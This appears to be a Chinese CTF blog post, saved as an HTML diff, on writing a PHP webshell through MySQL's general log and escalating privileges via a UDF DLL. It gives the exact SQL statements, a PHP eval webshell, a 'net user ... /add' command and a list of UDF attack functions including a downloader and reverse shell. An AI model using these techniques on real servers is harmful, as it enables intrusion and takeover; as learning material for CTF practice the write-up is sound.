@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,MySQL," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="secure-file-privMYSQL的secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。">
+<meta name="keywords" content="CTF,MySQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MYSQL写shell与提权">
+<meta property="og:url" content="http://yoursite.com/2018/09/12/MYSQL写shell与提权/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="secure-file-privMYSQL的secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536502264222.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536502530866.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536502685967.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536504215364.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536504354164.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536504610733.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536504793545.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536505034796.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536511278900.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536511808489.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536512327992.png">
+<meta property="og:updated_time" content="2018-09-12T04:09:06.083Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MYSQL写shell与提权">
+<meta name="twitter:description" content="secure-file-privMYSQL的secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536502264222.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/12/MYSQL写shell与提权/"/>
+
+
+
+
+
+  <title>MYSQL写shell与提权 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/12/MYSQL写shell与提权/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MYSQL写shell与提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-09-12T11:55:08+08:00">
+                2018-09-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure-file-priv"></a>secure-file-priv</h1><p>MYSQL的secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。<a id="more"></a>当<code>secure_file_priv</code>的值没有具体值时，表示不对mysql 的导入|导出做限制，如果是null，表示mysql不允许导入导出，图中表示mysql的导入和导出被限制在<code>/var/lib/mysql-files/</code>目录下<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536502264222.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536502530866.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536502685967.png" alt="enter description here">可以看到，无论是写还是读文件，都只能在<code>/var/lib/mysql-files/</code>下进行。</p>
+<h1 id="Windows下通过日志写shell"><a href="#Windows下通过日志写shell" class="headerlink" title="Windows下通过日志写shell"></a>Windows下通过日志写shell</h1><p>Windows下，<code>show variables like &#39;%secure%&#39;</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536504215364.png" alt="enter description here">可以看到mysql不允许导入导出，直接写shell是不行的。然后可以看看log的位置，<code>show variables like &#39;general_log%&#39;;</code>，<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536504354164.png" alt="enter description here">可以看到phpstudy，因此猜测网站根目录是<code>C:\phpStudy\WWW\</code>，接着，开启日志记录：<code>set global general_log=&#39;on&#39;;</code>然后再将日志文件导出到指定目录：<code>set global general_log_file=&#39;C:/phpstudy/WWW/comrade.php&#39;;</code>要注意的是，windows下的目录用的是反斜杠，但是在用mysql指定目录的时候用的是正斜杠。然后，<code>select &#39;&lt;?php eval($_POST[&quot;comrade&quot;]);?&gt;&#39;</code>，这时候日志文件就会变成这样<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536504610733.png" alt="enter description here">直接可以蚁剑连上<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536504793545.png" alt="enter description here">最后关闭log记录<code>set global general_log=off;</code>这时候通过蚁剑的终端可以看到，用户权限较低，创建用户失败<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536505034796.png" alt="enter description here"><code>net user comrade 666 /add</code>的意思是创建一个comrade用户，密码666。</p>
+<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h2><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数。例如<code>select count(*) from table;</code>count是MySQL内部的方法，有时候MySQL内部方法不能满足我们的需求，所以MySQL提供了对外的接口，允许用户自定义函数，开发UDF需要用C/C++。</p>
+<h2 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h2><p>动态链接库是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式。<br>动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。<br>Windows 中，DLL 多数情况下是带有 “.dll” 扩展名的文件，但也可能是 “.ocx”或其他扩展名；Linux系统中常常是 “.so” 的文件。</p>
+<h2 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h2><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用<code>CREAT FUNCITON</code>调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>在MySQL版本&gt;5.1的时候，udf.dll文件要放在MySQL安装目录下的lib/plugin目录下，这里我卡住了很久，不知道win10的udf.dll放在哪里，后面发现，sqlmap是有自带的MYSQL的udf.dll的，简直神器啊。。。使用sqlmap的dll之前要先解密<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536511278900.png" alt="enter description here">再把udf.dll放到相应的目录下，就完成了udf的动态链接库的导出，但是还不能用里面的函数，要用的话还要在MySQL中导入：<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;;</code>sys_eval函数可执行任意命令，常见函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cmdshell 执行cmd;</span><br><span class="line"></span><br><span class="line">downloader 下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line"></span><br><span class="line">open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line"></span><br><span class="line">backshell 反弹Shell;</span><br><span class="line"></span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line"></span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line"></span><br><span class="line">regread 读注册表;</span><br><span class="line"></span><br><span class="line">regwrite 写注册表;</span><br><span class="line"></span><br><span class="line">shut 关机,注销,重启;</span><br><span class="line"></span><br><span class="line">about 说明与帮助函数;</span><br></pre></td></tr></table></figure></p>
+<p>执行命令：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536511808489.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536512327992.png" alt="enter description here">主题应该是提权，but，我执行<code>select sys_eval(&#39;net user comrade 666 /add&#39;);</code>没有任何反应鸭…</p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="https://xz.aliyun.com/t/2719#reply-10710" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719#reply-10710</a><br><a href="https://www.jianshu.com/p/5b34c1b6dee7" target="_blank" rel="noopener">https://www.jianshu.com/p/5b34c1b6dee7</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/MySQL/" rel="tag"># MySQL</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/12/time-base-order-injection/" rel="next" title="命令注入中的时间盲注">
+                <i class="fa fa-chevron-left"></i> 命令注入中的时间盲注
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#secure-file-priv"><span class="nav-number">1.</span> <span class="nav-text">secure-file-priv</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows下通过日志写shell"><span class="nav-number">2.</span> <span class="nav-text">Windows下通过日志写shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UDF提权"><span class="nav-number">3.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF"><span class="nav-number">3.1.</span> <span class="nav-text">UDF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态链接库"><span class="nav-number">3.2.</span> <span class="nav-text">动态链接库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权分析"><span class="nav-number">3.3.</span> <span class="nav-text">提权分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过程"><span class="nav-number">4.</span> <span class="nav-text">过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">5.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
